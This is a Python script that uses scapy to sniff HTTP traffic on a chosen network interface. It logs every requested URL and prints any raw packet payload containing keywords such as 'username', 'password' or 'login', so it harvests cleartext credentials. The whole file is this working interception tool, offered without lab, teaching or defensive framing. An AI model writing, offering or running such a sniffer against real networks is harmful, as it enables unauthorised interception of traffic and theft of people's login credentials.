#!/usr/bin/env python 
from scapy.layers import http
import scapy.all as scapy
import argparse

def getargs () :
    parser=argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Select the interface you want")
    opt=parser.parse_args()
    if not opt.interface :
        parser.error("[-] Please Provide an interface")
    else :
        return opt    

def sniff (interface) :
    scapy.sniff(iface=interface ,store=False,prn=process_packets)


def process_packets(packet) :
    if packet.haslayer(http.HTTPRequest) :
        keywords=["usr","username","password","pass","login"]
        url=packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request >> "+ url)
        if packet.haslayer(scapy.Raw):
            for element in keywords :
                if element in packet[scapy.Raw].load :
                    print("\n\n[+] Possible Username/Password >> "+ packet[scapy.Raw].load + "\n\n")
                
opt=getargs()
if opt is not None :
    sniff(opt.interface)        